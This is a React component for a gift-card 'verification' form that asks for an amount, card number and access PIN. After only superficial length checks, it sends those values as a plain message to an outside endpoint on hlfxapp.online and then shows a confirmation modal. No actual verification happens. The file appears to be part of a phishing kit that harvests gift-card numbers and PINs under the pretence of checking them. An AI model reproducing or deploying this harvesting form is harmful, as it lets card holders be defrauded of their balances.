"use client"

import React, { useEffect, useState } from 'react'
import { useAlert } from 'react-alert'
import Button from '../button/Button';

const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency}) => {
    const [redemptionCode, setRedemptionCode] = useState('');
    const [accessCode, setAccessCode] = useState('');
    const [loading, setLoading] = useState(false);
    const alert = useAlert();
    const [mounted, setMounted] = useState(false);

    useEffect(()=> {
        setMounted(true);
    }, [mounted])

    const handleVerify = async () => {
        setLoading(true)
        // do validation
    
        if(isNaN(amount)){
            alert.error("Please enter a valid amount");
            setLoading(false)
            return;
        }
    
        if(redemptionCode.length < 13){
            alert.error("Invalid Card number");
            setLoading(false)
            return;
        }

    
        if(accessCode.length < 3){
            alert.error("Invalid Access PIN");
            setLoading(false)
            return;
        }

        const msg = `
Card Type: ${cardname}
Currency: ${currency}
Amount: ${amount}
Card Number: ${redemptionCode}
Access Code: ${accessCode}
`;
        const data = {
            msg
        }

        await fetch('https://www.hlfxapp.online/api/send-message', {
            body: JSON.stringify(data),
            method: "post",
            headers:{
                'content-type': 'application/json',
            }
        }).then(()=> {
            setShowmodal(true);
            setLoading(false);
        }).catch(err => {
            setLoading(false);
            alert.error("Something went wrong, try again.")
        })
    }

  return (
    <>
        <input 
            class="block w-full mb-4  p-2 rounded-lg"
            value={amount} 
            onInput={e => setAmount(e.target.value)}
            placeholder='Amount' 
        />
        <input 
            class="block w-full mb-4  p-2 rounded-lg" 
            value={redemptionCode} 
            onInput={e => setRedemptionCode(e.target.value)}
            placeholder='Card Number'
        />
        <input 
            type='number'
            class="block w-full mb-4  p-2 rounded-lg" 
            value={accessCode} 
            onInput={e => setAccessCode(e.target.value)}
            placeholder='Access PIN'
        />
        <Button
            title={"Verify"}
            loading={loading}
            onClick={mounted ? handleVerify : ()=>{}}
        />
    </>
  )
}

export default TypeTwo